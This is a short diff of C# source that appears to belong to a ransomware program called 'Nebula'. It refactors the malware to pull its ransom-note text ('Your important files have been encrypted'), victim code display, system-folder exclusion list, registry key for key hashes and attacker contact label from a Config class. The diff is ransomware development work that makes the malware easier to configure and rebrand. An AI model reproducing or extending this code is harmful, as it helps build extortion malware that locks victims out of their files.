@@ -75,7 +75,7 @@ public class Nbl : Form
         {
                 get
                 {
-                        return "ATTENTION!\n\nYour important files have been encrypted with military-grade XChaCha8 encryption.\n\nTo decrypt your files, run the Nebula Decryptor application and enter your 32-byte Base64 key.\n\nYour Victim Code is: " + VictimCode;
+                        return Config.GetNoteText(VictimCode);
                 }
         }
 
@@ -157,26 +157,13 @@ public class Nbl : Form
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool FindClose(IntPtr hFindFile);
 
-        private static readonly string[] SystemFolderKeywords = new string[]
-        {
-                "\\system32",
-                "\\syswow64",
-                "\\syswow",
-                "\\windows",
-                "\\winsxs",
-                "\\winsxs64",
-                "microsoft",
-                "windows"
-        }; /* KEYWORDS TO IGNORE */
-
-        private const string RegKeyPath = @"Software\NebulaRun";
-        private const string RegKeyHashesValue = "KeyHashes";
+        private const string RegKeyHashesValue = Config.RegKeyHashesValue;
 
         private static bool IsSystemFolder(string path)
         {
                 if (string.IsNullOrEmpty(path)) return true;
                 string lower = path.ToLowerInvariant();
-                foreach (string keyword in SystemFolderKeywords)
+                foreach (string keyword in Config.SystemFolderKeywords)
                 {
                         if (lower.Contains(keyword))
                         {
@@ -330,7 +317,7 @@ public class Nbl : Form
                 KeyHashes = new List<string>();
                 try
                 {
-                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKeyPath))
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Config.RegKeyPath))
                         {
                                 if (key != null)
                                 {
@@ -360,7 +347,7 @@ public class Nbl : Form
         {
                 try
                 {
-                        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(RegKeyPath))
+                        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(Config.RegKeyPath))
                         {
                                 if (key != null)
                                 {
@@ -801,7 +788,7 @@ public class Nbl : Form
                 ((Control)labelContactInfo).Name = "labelContactInfo";
                 ((Control)labelContactInfo).Size = new Size(321, 28);
                 ((Control)labelContactInfo).TabIndex = 2;
-                ((Control)labelContactInfo).Text = "Contact: EXAMPLE"; /* CONTACT */
+                ((Control)labelContactInfo).Text = "Contact: " + Config.ContactInfo; /* CONTACT */
                 ((Control)labelVictimCode).AutoSize = true;
                 ((Control)labelVictimCode).Font = new Font("Segoe UI", 12f, (FontStyle)1);
                 ((Control)labelVictimCode).ForeColor = Color.DodgerBlue;
